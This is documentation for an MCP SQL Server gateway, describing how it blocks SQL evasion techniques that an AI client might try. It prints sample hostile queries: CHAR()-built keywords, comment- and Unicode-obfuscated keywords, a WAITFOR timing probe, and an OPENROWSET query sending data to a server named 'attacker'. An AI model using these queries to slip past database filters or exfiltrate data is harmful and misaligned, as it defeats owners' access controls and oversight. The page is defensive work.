---
title: AI-Assisted Attack Protection
description: New attack vectors an AI can use to bypass security controls and how MCP-Go-MSSQL mitigates them
---

MCP-Go-MSSQL implements specific defenses against attack techniques that an AI can execute automatically, iterating and adjusting queries until it finds weaknesses in traditional controls.

## Why AIs are different

Unlike a human attacker, an AI can:

- Write complex, syntactically correct SQL without errors
- Automatically iterate over multiple variations of a query
- Infer database structure through error messages
- Chain operations that individually appear harmless
- Try thousands of variations per minute

## Blocked attack vectors

### 1. CHAR()/NCHAR() concatenation

An AI can dynamically build SQL keywords to evade regex detection:

```sql
-- Instead of "SELECT", uses:
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84) * FROM users

-- Equals: SELECT * FROM users
```

**Mitigation**: The server detects 3+ CHAR/NCHAR concatenation patterns and blocks the query before execution.

### 2. Inline comments to hide keywords

An AI can hide SQL keywords inside comments:

```sql
-- Keyword split by comment:
SEL/*comment*/ECT * FROM users

-- Keyword hidden at start:
/*INS*/ INSERT INTO users VALUES (1)
```

**Mitigation**: `stripAllComments()` removes ALL SQL comments (not just leading ones) before validating keywords. The validation compares the original query with the comment-stripped version — if a keyword disappears after removing comments, it is blocked.

### 3. Table hints (NOLOCK, READUNCOMMITTED)

An AI could attempt dirty reads to bypass controls:

```sql
SELECT * FROM users WITH (NOLOCK)
SELECT * FROM users WITH (READUNCOMMITTED)
SELECT * FROM users WITH (TABLOCK)
```

**Mitigation**: The server blocks all dangerous table hints that allow non-standard read behaviors.

### 4. WAITFOR DELAY (timing attacks)

An AI can infer data existence by measuring response times:

```sql
-- If the user exists, WAITFOR causes a delay
IF (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0
  WAITFOR DELAY '00:00:05'
```

**Mitigation**: The server blocks all queries containing `WAITFOR`.

### 5. OPENROWSET / OPENDATASOURCE

An AI could attempt to exfiltrate data to external servers:

```sql
SELECT * FROM OPENROWSET('SQLNCLI',
  'Server=attacker;Trusted_Connection=yes',
  'SELECT * FROM users')
```

**Mitigation**: These functions are blocked and never execute.

### 6. Subqueries to bypass whitelist

An AI could access restricted tables through subqueries:

```sql
-- The "secrets" table is not in whitelist,
-- but this query accesses it through a subquery:
SELECT * FROM (SELECT secret_col FROM secrets) AS x
```

**Mitigation**: `validateSubqueriesForRestrictedTables()` analyzes all tables referenced inside subqueries and verifies they are also in the whitelist.

### 7. Unicode bidirectional control characters

Invisible characters can reverse text rendering direction:

```sql
-- \u202E = RTL Override, visually looks like "SEL* CT"
SELECT\u202E * FROM users

-- Zero-width space splits the keyword:
SEL\u200BECT * FROM users  -- Visually: SELECT
```

**Mitigation**: The server detects and rejects queries with Unicode control characters (U+200B..U+200F, U+202A..U+202E, U+2066..U+2069).

### 8. Unicode homoglyphs

Non-Latin characters that look identical to Latin letters:

```sql
-- \u0435 = Cyrillic 'е', visually indistinguishable from 'e'
SEL\u0435CT * FROM users  -- Rendered as SELECT
```

**Mitigation**: `containsHomoglyphs()` detects non-ASCII letters that could be homoglyphs. `normalizeToASCII()` transliterates Cyrillic/Greek to Latin before validating.

## String literal preservation

All pattern validations ignore content inside SQL strings:

```sql
-- This is NOT blocked (CHAR concatenation is inside a string):
SELECT 'CHAR(83)+CHAR(69)' AS text FROM users

-- This IS blocked (CHAR concatenation is real code):
CHAR(83)+CHAR(69)+CHAR(76) FROM users
```

The `stripStringLiterals()` function removes the content of `'...'` and `"..."` before applying pattern matching, avoiding false positives.

## Security functions summary

| Function | Purpose |
|----------|---------|
| `stripAllComments()` | Removes all SQL comments |
| `stripStringLiterals()` | Removes string literals before pattern matching |
| `containsCharConcatenation()` | Detects CHAR()/NCHAR() concat |
| `containsDangerousHints()` | Detects WITH (NOLOCK), etc. |
| `containsWaitfor()` | Detects WAITFOR DELAY |
| `containsOpenrowset()` | Detects OPENROWSET/OPENDATASOURCE |
| `containsHomoglyphs()` | Detects Unicode homoglyphs |
| `normalizeToASCII()` | Transliterates homoglyphs to ASCII |
| `validateQueryUnicodeSafety()` | Unicode validation orchestrator |
| `validateSubqueriesForRestrictedTables()` | Validates subquery tables against whitelist |

## Destructive operation confirmation

Beyond blocking specific attacks, the server implements a confirmation system for DDL operations that could destroy data or existing objects.

### Operations requiring confirmation

When `MSSQL_CONFIRM_DESTRUCTIVE=true` (default), the following operations require explicit confirmation if the target object already exists:

| Operation | Target |
|-----------|--------|
| `ALTER VIEW` | Existing view |
| `DROP TABLE` | Existing table |
| `DROP VIEW` | Existing view |
| `DROP PROCEDURE` | Existing procedure |
| `DROP FUNCTION` | Existing function |
| `ALTER TABLE` | Existing table |
| `TRUNCATE TABLE` | Existing table |

### How it works

1. AI sends a destructive query (e.g. `ALTER VIEW dbo.MyView AS SELECT 1`)
2. Server detects the object exists → returns error `-32000` with confirmation token
3. Client shows warning to user
4. User calls `confirm_operation { token: "abc123..." }` to execute
5. Token expires in 5 minutes and is single-use

### AUTOPILOT mode

For development with AI that needs full autonomy within a limited scope:

```bash
MSSQL_AUTOPILOT=true
MSSQL_WHITELIST_TABLES=temp_ai,v_temp_ia
```

In autopilot mode:
- No confirmation required for destructive DDL
- No schema validation (AI can create/modify without blocks)
- Whitelist still active: only objects in `MSSQL_WHITELIST_TABLES` can be modified

## Tests

```bash
# Run AI attack vector test suite
go test -v -run TestAIAttackVectors ./test/security/...

# Vulnerability verification
govulncheck ./...
```

20 test cases cover: CHAR concatenation, NOLOCK hints, WAITFOR timing attacks, OPENROWSET exfiltration, Unicode bidirectional control characters, and false positives with string literals.
